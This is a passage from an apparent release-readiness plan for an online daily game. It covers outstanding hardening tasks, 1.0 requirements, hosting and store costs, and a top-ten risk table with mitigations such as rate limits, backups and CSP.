8. **Per-IP limits on all unauthenticated writes and GET minting** (S3, §2): identity/groups/report POSTs, `/daily?date=`/`/weekly?week=` bounded to the service's lifetime. S.
9. **Logs**: hash/omit raw IPs, strip `group=` from logged URLs, log the exception on 500s, Docker log rotation (S6, S7). S.
10. **Uptime check on `/health` with an alert**; `MODERATION_TOKEN` set; moderation response target written down. S.
11. **`LICENSE` + copyright holder + root README** for the public repo. S.
12. Run `tools/image-smoke.ts` and `tools/mint-check.ts` against the hosted URL and record it in STATUS (the ROADMAP 0.7.8 ⚑ acceptance).

## (b) P1 — cannot call it 1.0 without
- Signed Windows installer built and published by CI (GitHub Release + GHCR image push), tested on a clean machine; Electron/Node patch cadence with Dependabot and `npm audit` in CI.
- SQLite behind `Board` when a measured month crosses the trigger (0.7.0b) — expected around 500 daily players; `/health` reporting hot-file bytes and commit latency so the trigger is observable.
- PLAN-v5 0.8.7: reason codes, re-simulation in a worker with a timeout, `tools/void-day.ts` and the runbook line; graceful SIGTERM.
- Cross-engine determinism proven (0.8.0) and the browser matrix stated on the site.
- Structured logs, basic metrics, restore drill on a schedule, incident/secret-compromise/DSAR runbooks.
- Terms and privacy notice reviewed; DSAR export endpoint; retention schedule published; trademark search done.
- Second moderator or an auto-expiry, community guidelines, Discord live, appeal mailbox monitored.
- Assisted/Human boards (0.9.2), anomaly signals (0.9.4), review prompt (1.0.3), content freeze (0.9.7).
- Steam page, demo, trailer, press kit; pricing and discount calendar written (1.0.2).
- PLAN-v1 1.0.5 exit criteria met (30 days without a voided day, moderation within 72 h, zero `did_not_reproduce` on valid replays).

## (c) Recurring and one-off costs
| Cost | Amount | When | Source |
|---|---|---|---|
| Hetzner CX23 VPS | €3.99/mo | beta | DOSSIER §6 |
| Larger VPS at 10k DAU | €7–15/mo | growth | approx., unverified |
| Cloudflare Pages | €0 | always | DOSSIER §6 |
| Domain (`junkyarddraft.com`, optionally `.io`) | ≈ €10–15/yr each | now | approx., unverified; DOSSIER says `.io` "if under $40/yr" |
| Off-site backup storage | ≈ €3–4/mo | beta | approx., unverified |
| Uptime monitor / Discord / GHCR | €0 | beta | free tiers, unverified |
| Steam Direct fee | $100 one-off, recoupable after $1,000 | pre-1.0 | DOSSIER §6 |
| Code signing | ≈ $9.99/mo (Azure Trusted Signing) or $150–300/yr (OV) | 1.0 | PLAN-v1 1.0.1 |
| Apple Developer Program | $99/yr | only if macOS | PLAN-v1 1.0.1 |
| Trademark search / EUIPO filing | €0 / ≈ €850 one class | optional | approx., unverified |
| Capsule/store art | ≈ $200–800 one-off | pre-Steam | approx., unverified |
| Operator time | 2–4 h/week beta; 10+ h/week launch | — | estimate |

## (d) Top 10 risks and mitigations
1. **Token theft via `?verifier=` or XSS (no CSP)** → account takeover of any player who clicks a link. *Mitigate:* P0 items 1 and 3; consider binding the token to the verifier origin at first claim.
2. **One griefer blanks the boards with reports** (free identities + instant hide). *Mitigate:* P0 item 7.
3. **Storage/CPU exhaustion by unauthenticated writes** (`/identity` floods, `/daily?date=` minting back to year 0, synchronous full-file commits). *Mitigate:* P0 item 8; cap `players`; SQLite when measured.
4. **`DAILY_SECRET` leak or loss** → silent pre-play of future seeds, or a broken commitment chain. *Mitigate:* out-of-band provisioning, offline copy, a documented rotation + announcement runbook, `mint-check.ts --secret` in a weekly job.
5. **Data loss on a single VPS volume** (no backups). *Mitigate:* P0 item 4; restore drill.
6. **Legal exposure**: no privacy notice/terms, raw IPs in logs, deletion not exercisable, public repo without a licence. *Mitigate:* P0 items 5, 6, 9, 11.
7. **Hot-file growth past 5 MB around ~500 daily players on a 2-vCPU box** → commit latency blocks the loop. *Mitigate:* observe via `/health`, schedule 0.7.0b, keep `PLAYER_RATE_LIMIT` at 2.
8. **Single-person operations**: no monitoring, no alerting, moderation and incidents land on one person. *Mitigate:* free uptime monitor, Discord status channel, 72-h auto-unhide, "best effort" terms, a trusted second moderator.
9. **Unsigned installer / SmartScreen and no auto-update** → desktop channel looks untrustworthy and ships stale Electron. *Mitigate:* web-first beta, sign before 1.0, Steam updater for that channel, quarterly Electron bump.
10. **Browser determinism unproven** (Chromium only in CI) → a Firefox/Safari player's valid replay could fail to verify and be called a cheat. *Mitigate:* PLAN-v5 0.8.0 before the beta widens; state the supported browsers on the site; reason codes (0.8.7) so "did not reproduce" is explained.
